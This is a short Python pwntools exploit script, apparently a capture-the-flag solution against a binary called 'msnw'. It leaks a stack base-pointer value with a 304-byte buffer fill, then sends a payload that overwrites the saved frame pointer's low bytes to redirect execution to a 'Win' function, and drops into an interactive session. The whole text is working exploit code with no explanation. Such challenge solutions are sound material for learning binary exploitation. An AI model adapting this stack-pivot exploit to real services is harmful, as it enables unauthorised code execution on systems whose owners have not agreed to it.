#!/usr/bin/env python3

from pwn import *

exe = ELF("./msnw", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("addr", 1337)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        	b* 0x0000000000401292
            c
            set follow-fork-mode parent
            ''')

# GDB()
# Step 1: Leak rbp
payload = b'a'*304
p.sendafter('meong 🐶: ', payload)
p.recvuntil(payload)
leak = u64(p.recv(6) + b'\0\0')
print("next rbp leak: " + hex(leak))

payload = b'a'*16 + p64(exe.sym['Win']) + b'a'*280 + p16((leak - 0x328) & 0xffff)
print(len(payload))
p.sendafter('meong 🐶: ', payload)

p.interactive()